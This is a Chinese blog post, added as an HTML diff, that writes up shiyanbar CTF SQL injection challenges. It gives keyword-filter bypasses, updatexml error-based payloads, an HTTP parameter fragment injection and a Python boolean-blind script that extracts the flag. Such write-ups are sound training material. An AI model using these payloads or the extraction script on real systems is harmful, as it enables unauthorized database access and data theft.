@@ -1,0 +1,816 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  
+    <title>实验吧 web writeup | TO DO</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Max">
+    
+
+    
+    <meta name="description" content="本篇博客连续更新实验吧的web篇解题思路。">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧 web writeup">
+<meta property="og:url" content="http://juniorprincewang.github.io/2018/04/18/实验吧-web-writeup/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="本篇博客连续更新实验吧的web篇解题思路。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-06-12T06:41:26.353Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧 web writeup">
+<meta name="twitter:description" content="本篇博客连续更新实验吧的web篇解题思路。">
+
+    
+    <link rel="alternative" href="/atom.xml" title="TO DO" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+</html>
+  <body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="TO DO" title="TO DO"></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="TO DO">TO DO</a></h1>
+				<h2 class="blog-motto">吾尝终日而思矣，不如须臾之所学也。</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search">
+						<input type="hidden" name="q" value="site:juniorprincewang.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</ul></nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/18/实验吧-web-writeup/" title="实验吧 web writeup" itemprop="url">实验吧 web writeup</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Max" target="_blank" itemprop="author">Max</a>
+		
+  </p><p class="article-time">
+    <time datetime="2018-04-18T11:03:31.000Z" itemprop="datePublished"> Published 2018-04-18</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的SQL注入"><span class="toc-number">1.</span> <span class="toc-text">简单的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#采用-报错注入-内联注释-方式。"><span class="toc-number">1.1.</span> <span class="toc-text">采用 报错注入 + 内联注释 方式。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内联注释"><span class="toc-number">1.1.1.</span> <span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#双重关键字"><span class="toc-number">1.2.</span> <span class="toc-text">双重关键字</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的SQL注入2"><span class="toc-number">2.</span> <span class="toc-text">简单的SQL注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#加了料的报错注入"><span class="toc-number">3.</span> <span class="toc-text">加了料的报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP分割注入（HTTP-Parameter-Fragment）"><span class="toc-number">3.1.</span> <span class="toc-text">HTTP分割注入（HTTP Parameter Fragment）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的SQL注入3"><span class="toc-number">4.</span> <span class="toc-text">简单的SQL注入3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+		
+		</div>
+		
+		<p>本篇博客连续更新实验吧的web篇解题思路。</p>
+<a id="more"></a>
+
+
+<h1 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h1><p>在ID框 输入1，有返回信息。</p>
+<pre><code>ID: 1
+name: baloteli</code></pre><p>输入 <code>&#39;</code>，报错。</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;&apos;&apos;&apos; at line 1</code></pre><p>然后输入所有关键字信息，看到底过滤了什么。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and or union select from where = information_schema table_name table_schema column_name order by information_schema.tables --+ /**/ // # %00</span><br></pre></td></tr></table></figure>
+
+<p>得到信息：</p>
+<pre><code>ID: 1 or   = information_schema table_name information_schema.tables    /**/ //</code></pre><p>看来屏蔽了不少关键字。</p>
+<p>对于过滤，可以考虑 <code>内联注释</code>、<code>双重关键字</code> 、 <code>大小写混用</code> 、 <code>编码</code> 。</p>
+<p><code>大小写混用</code> 不好使。</p>
+<p>这里尝试注入 <code>1&#39; or &#39;1&#39;=&#39;1</code>，得到正常信息，怀疑sql语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from xx where id=&apos;xxx&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="采用-报错注入-内联注释-方式。"><a href="#采用-报错注入-内联注释-方式。" class="headerlink" title="采用 报错注入 + 内联注释 方式。"></a>采用 <code>报错注入</code> + <code>内联注释</code> 方式。</h2><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>采用 <code>/*! code */</code> 来执行我们的SQL语句。</p>
+<p>比如一个过滤器过滤了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union,where, table_name, table_schema, =, and information_schema</span><br></pre></td></tr></table></figure>
+
+<p>这些都是我们内联注释需要绕过的目标。所以通常利用内联注释进行如下方式绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -</span><br></pre></td></tr></table></figure>
+
+<p>这里我们需要的语句是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or updatexml(1,concat(&apos;~&apos;,(select database() LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or updatexml(1,concat(&apos;~&apos;,(/*!select*/ database() LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>得到反馈信息：</p>
+<pre><code>XPATH syntax error: &apos;~web1~&apos;</code></pre><p>查表名字：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or updatexml(1,concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=&apos;web1&apos; LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or updatexml(1,concat(&apos;~&apos;,(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schema*/=&apos;web1&apos; LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>这里报错了！</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;=&apos;web1&apos; limit 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1&apos;&apos; at line 1</code></pre><p>明明在前面的验证中， <code>table_schema</code> 是被过滤的呀，添加了内联注释也不行？</p>
+<p>在尝试了<code>1 /*!table_schema*/</code> 之后发现，果然被过滤掉了。</p>
+<p>那采取 <code>双重关键字</code> 。 <code>table_schema</code> 换成 <code>table_schtable_schemaema</code></p>
+<p>输入 <code>1 table_schtable_schemaema</code> 得到 <code>&gt;ID: 1  table_schema</code>。很好。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or updatexml(1,concat(&apos;~&apos;,(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schtable_schemaema*/=&apos;web1&apos; LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>拿到表格</p>
+<pre><code>XPATH syntax error: &apos;~flag~&apos;</code></pre><p>之后继续拿字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or updatexml(1,concat(&apos;~&apos;,(/*!select*/  column_name /*!from*/ information_schema.columns /*!where*/ table_name=&apos;flag&apos; LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>输入后，发现 <code>column_name</code> 、 <code>information_schema.columns</code> 都被过滤了，好奇怪。拿只好用 <code>双重关键字</code> 方法了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or updatexml(1,concat(&apos;~&apos;,(/*!select*/  colucolumn_namemn_name  /*!from*/ infinformation_schema.columnsormation_schema.columns /*!where*/ table_name=&apos;flag&apos; LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<pre><code>XPATH syntax error: &apos;~flag~&apos;</code></pre><p>得到表的字段：<code>flag</code>, <code>id</code></p>
+<p>直接获取 <code>flag</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or updatexml(1,concat(&apos;~&apos;,(/*!select*/  flag  /*!from*/ flag LIMIT 0,1),&apos;~&apos;),3) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+
+<pre><code>XPATH syntax error: &apos;~flag{Y0u_@r3_5O_dAmn_90Od}~&apos;</code></pre><h2 id="双重关键字"><a href="#双重关键字" class="headerlink" title="双重关键字"></a><code>双重关键字</code></h2><h1 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h1><p>搞了半天就屏蔽了空格符号。那么把空格符替换掉就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&apos;1&apos;%3d&apos;1</span><br></pre></td></tr></table></figure>
+
+<pre><code>ID: 1&apos;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&apos;1&apos;=&apos;1&lt;br&gt;name: baloteli&lt;/pre&gt;&lt;pre&gt;ID: 1&apos;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&apos;1&apos;=&apos;1&lt;br&gt;name: flag{Y0u_@r3_5O_dAmn_90Od}</code></pre><h1 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h1><p>根据提示，本题修改HTTP数据传输方式为<code>POST</code>，传输数据为 <code>username=1&amp;password=1</code> 。</p>
+<p>提示</p>
+<blockquote>
+<p>Login failed</p>
+<!-- $sql="select * from users where username='$username' and password='$password'";  -->
+</blockquote>
+<p>绕过password：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos;&amp;password=or&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>构造的SQL语句为 </p>
+<blockquote>
+<p>select * from users where username=’1’<code>&#39; and password=&#39;</code>or’1’</p>
+</blockquote>
+<p>得到的显示结果为</p>
+<blockquote>
+<p>You are our member, welcome to enter</p>
+</blockquote>
+<p>没有给出回显字段，可以通过基于错误回显的SQL注入。</p>
+<p>先分别查看 <code>username</code> 和 <code>password</code> 过滤的字符串</p>
+<p><code>username</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--+ # = - mid like union order limit substr rand ascii sleep ( )</span><br></pre></td></tr></table></figure>
+
+<p><code>password</code>： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--+ # = - mid like union order limit substr rand ascii sleep extractvalue updatexml</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP分割注入（HTTP-Parameter-Fragment）"><a href="#HTTP分割注入（HTTP-Parameter-Fragment）" class="headerlink" title="HTTP分割注入（HTTP Parameter Fragment）"></a>HTTP分割注入（HTTP Parameter Fragment）</h2><p>基于错误回显的注入为<br><code>updatexml(1,concat(0x7e,version(),0x7e),1)</code>，但是这条语句不能通过单一的参数传，两个参数过滤的关键字不同，<br>可以采用HTTP分割注入：<code>username</code> 未过滤 <code>updatexml</code> ，而 <code>password</code> 未过滤 <code>()</code>， 中间的语句通过注释符过滤掉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=*/(1,concat(0x7e, (version()),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure>
+
+<p>得到回显错误：</p>
+<blockquote>
+<p>XPATH syntax error: ‘<del>5.5.47</del>‘</p>
+</blockquote>
+<p>那么接下来就是顺利成章的爆出数据库、表、字段和数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=*/(1,concat(0x7e,database(),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>XPATH syntax error: ‘<del>error_based_hpf</del>‘
+password过滤了 <code>=</code> 和 <code>like</code>，那么可以采用 <code>regexp</code> 或者 不等号<code>&lt;&gt;</code> 来查询。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=*/(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema regexp database(),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure>
+
+<p>上面的用例报错，由于没有在 <code>select group_concat(table_name) from information_schema.tables where table_schema regexp database()</code> 外面加括号导致，很费解，加上就好了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=*/(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or &apos;</span><br><span class="line"># 或者</span><br><span class="line">username=1&apos; or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema&lt;&gt;database())),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>XPATH syntax error: ‘<del>ffll44jj,users</del>‘</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=*/(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>XPATH syntax error: ‘<del>value</del>‘</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=*/(1,concat(0x7e, (select group_concat(value) from ffll44jj),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>XPATH syntax error: ‘<del>flag{err0r_b4sed_sqli_+_hpf}</del>‘</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/s1ye/p/8284806.html" target="_blank" rel="noopener">加了料的报错注入(实验吧)</a></p>
+<h1 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h1><p>字符型注入</p>
+<p>布尔型盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and (select count(*) from flag)&gt;0--+</span><br><span class="line">1&apos; and (select ascii(substr(flag,1,1)) from flag limit 0,1)&gt;97--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url=&quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&apos; and (select length(flag) from flag limit 0,1)=&#123;0&#125;--+&quot;</span><br><span class="line">url2=&quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&apos; and (select ascii(substr(flag,&#123;0&#125;,1)) from flag limit 0,1)=&#123;1&#125;--+&quot;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">i=0</span><br><span class="line">while True:</span><br><span class="line">        i+=1</span><br><span class="line">        res=requests.get(url.format(i))</span><br><span class="line">        if res.content.find(&quot;Hello!&quot;)!= -1:</span><br><span class="line">                print &quot;Found it, i=&quot;,i</span><br><span class="line">                break</span><br><span class="line">        print &quot;Not found, i=&quot;,i</span><br><span class="line"></span><br><span class="line">Found it, i= 26</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">printable=string.printable</span><br><span class="line">print &quot;printable is &quot;,printable</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for i in range(26):</span><br><span class="line">        print &quot;Now i=&quot;,i+1</span><br><span class="line">        for c in (printable):</span><br><span class="line">                res=requests.get(url2.format(i+1, ord(c)))</span><br><span class="line">                if res.content.find(&quot;Hello!&quot;)!= -1:</span><br><span class="line">                        print &quot;Found it, i=&quot;,i+1, &quot;char is &quot;, c</span><br><span class="line">                        result+=c</span><br><span class="line">                        break</span><br><span class="line">print &quot;result is &quot; , result</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://hebin.me/2017/09/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7ctf%E8%A7%A3%E9%A2%98writeup%E5%A4%A7%E5%85%A8/" target="_blank" rel="noopener">西普实验吧CTF解题Writeup大全</a></li>
+</ul>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/sql注入/">sql注入</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/sql/">sql</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://juniorprincewang.github.io/2018/04/18/实验吧-web-writeup/" data-title="实验吧 web writeup | TO DO" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev">
+ <a href="/2018/04/24/Makefile语法/" title="make 命令">
+  <strong>上一篇：</strong><br>
+  <span>
+  make 命令</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/04/16/shell脚本编程简介/" title="shell脚本编程简介">
+ <strong>下一篇：</strong><br> 
+ <span>shell脚本编程简介
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的SQL注入"><span class="toc-number">1.</span> <span class="toc-text">简单的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#采用-报错注入-内联注释-方式。"><span class="toc-number">1.1.</span> <span class="toc-text">采用 报错注入 + 内联注释 方式。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内联注释"><span class="toc-number">1.1.1.</span> <span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#双重关键字"><span class="toc-number">1.2.</span> <span class="toc-text">双重关键字</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的SQL注入2"><span class="toc-number">2.</span> <span class="toc-text">简单的SQL注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#加了料的报错注入"><span class="toc-number">3.</span> <span class="toc-text">加了料的报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP分割注入（HTTP-Parameter-Fragment）"><span class="toc-number">3.1.</span> <span class="toc-text">HTTP分割注入（HTTP Parameter Fragment）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的SQL注入3"><span class="toc-number">4.</span> <span class="toc-text">简单的SQL注入3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github Card</p>
+<div class="github-card" data-github="juniorprincewang" data-theme="medium"></div>
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js"></script>
+</div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/GPU/CUDA/" title="CUDA">CUDA<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/GPU/" title="GPU">GPU<sup>17</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/GPU/GPU虚拟化/" title="GPU虚拟化">GPU虚拟化<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/QEMU/" title="QEMU">QEMU<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/c/" title="c">c<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/security/crypto/" title="crypto">crypto<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/git/" title="git">git<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/hexo/" title="hexo">hexo<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/kernel/" title="kernel">kernel<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/" title="linux">linux<sup>20</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/GPU/nouveau/" title="nouveau">nouveau<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/security/pwn/" title="pwn">pwn<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/pwnable-kr/" title="pwnable.kr">pwnable.kr<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/python/" title="python">python<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/security/" title="security">security<sup>9</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/shell/" title="shell">shell<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/solutions/" title="solutions">solutions<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/sql注入/" title="sql注入">sql注入<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/tools/" title="tools">tools<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/vim/" title="vim">vim<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/虚拟化/virtio/" title="virtio">virtio<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/vps/" title="vps">vps<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/web安全/" title="web安全">web安全<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/虚拟化/" title="虚拟化">虚拟化<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>12</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CUDA/" title="CUDA">CUDA<sup>10</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/GPU/" title="GPU">GPU<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/linux/" title="linux">linux<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/heap/" title="heap">heap<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/QEMU/" title="QEMU">QEMU<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/vim/" title="vim">vim<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/virtio/" title="virtio">virtio<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/nouveau/" title="nouveau">nouveau<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/kernel/" title="kernel">kernel<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pwnable-kr/" title="pwnable.kr">pwnable.kr<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/gitlab/" title="gitlab">gitlab<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/git/" title="git">git<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/hexo/" title="hexo">hexo<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xss/" title="xss">xss<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/shell/" title="shell">shell<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sql/" title="sql">sql<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/堆溢出/" title="堆溢出">堆溢出<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/virtual-memory/" title="virtual memory">virtual memory<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu/" title="ubuntu">ubuntu<sup>2</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=null&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer">
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p>  <br>
+			上网不涉密，涉密不上网。</p>
+	</section>
+	 
+	<div class="social-font">
+		
+		
+		<a href="https://github.com/juniorprincewang" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:little0prince@163.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
+		
